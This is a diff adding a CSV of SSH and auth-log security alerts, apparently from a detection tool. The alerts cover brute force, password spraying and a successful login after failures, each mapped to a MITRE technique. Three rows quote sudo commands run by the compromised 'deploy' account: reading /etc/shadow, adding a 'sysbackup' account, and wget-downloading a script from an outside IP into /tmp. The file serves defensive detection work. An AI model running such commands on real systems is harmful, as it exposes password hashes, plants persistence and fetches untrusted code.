@@ -1,0 +1,10 @@
+severity,rule,ip,users,count,first_seen,last_seen,mitre,detail
+high,Brute force,203.0.113.45,root,60,2026-11-18 03:12:00,2026-11-18 03:20:35,T1110.001 Password Guessing,60 failed logins within 10 minutes
+high,Login success after failures,198.51.100.88,deploy,6,2026-11-18 21:07:20,2026-11-18 21:07:20,T1078 Valid Accounts,password login for 'deploy' after 6 failed attempts
+medium,Password spray,198.51.100.23,admin;ftp;git;guest;oracle;pi;postgres;support;test;ubuntu,10,2026-11-18 09:40:00,2026-11-18 09:51:39,T1110.003 Password Spraying,10 different usernames tried within 30 minutes
+medium,Brute force,198.51.100.23,ftp;git;guest;oracle;pi;postgres;test;ubuntu,16,2026-11-18 09:41:23,2026-11-18 09:51:13,T1110.001 Password Guessing,16 failed logins within 10 minutes
+medium,Brute force,198.51.100.88,deploy,6,2026-11-18 21:05:00,2026-11-18 21:06:54,T1110.001 Password Guessing,6 failed logins within 10 minutes
+medium,Sensitive sudo command,,deploy,1,2026-11-18 21:09:20,2026-11-18 21:09:20,T1548.003 Sudo and Sudo Caching,deploy ran as root: /usr/bin/cat /etc/shadow (reads password hashes)
+medium,Sensitive sudo command,,deploy,1,2026-11-18 21:11:20,2026-11-18 21:11:20,T1548.003 Sudo and Sudo Caching,deploy ran as root: /usr/sbin/useradd -m -s /bin/bash sysbackup (edits accounts)
+medium,Sensitive sudo command,,deploy,1,2026-11-18 21:13:20,2026-11-18 21:13:20,T1548.003 Sudo and Sudo Caching,deploy ran as root: /usr/bin/wget http://203.0.113.200/update.sh -O /tmp/u.sh (downloads a file)
+low,Direct root login,203.0.113.45,root,60,2026-11-18 03:12:00,2026-11-18 03:20:35,T1078.003 Local Accounts,60 root login attempts
